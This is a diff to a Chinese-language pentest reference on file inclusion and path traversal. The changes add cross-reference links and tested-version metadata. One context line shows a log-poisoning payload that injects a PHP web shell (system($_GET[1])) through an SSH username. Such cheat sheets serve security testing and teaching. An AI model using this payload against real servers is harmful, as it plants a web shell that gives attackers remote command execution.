@@ -1,7 +1,10 @@
 # 文件包含 / 路径遍历实战参考
+- 路径遍历与文件包含常组合使用 → `web-dir-traversal.md`
+- LFI 包含 Webshell 执行命令 → `web-rce.md`
 
 > 分类: LFI检测 → 路径遍历 → 日志投毒 → 伪协议 → Session文件 → /proc/self/environ → RCE
 
+> **last_updated**: 2026-06-04 | **tested_against**: PHP 8.x, Apache 2.4, Nginx 1.24
 ---
 
 ## 1. LFI / 路径遍历检测
@@ -275,5 +278,8 @@ ssh '<?php system($_GET[1]);?>'@target.com
 ```
 
 ---
+## 相关参考
+- 路径遍历与文件包含常组合使用 → `web-dir-traversal.md`
+- LFI 包含 Webshell 执行命令 → `web-rce.md`
 
 *参考: PayloadAllTheThings + HackTricks + 实战案例*
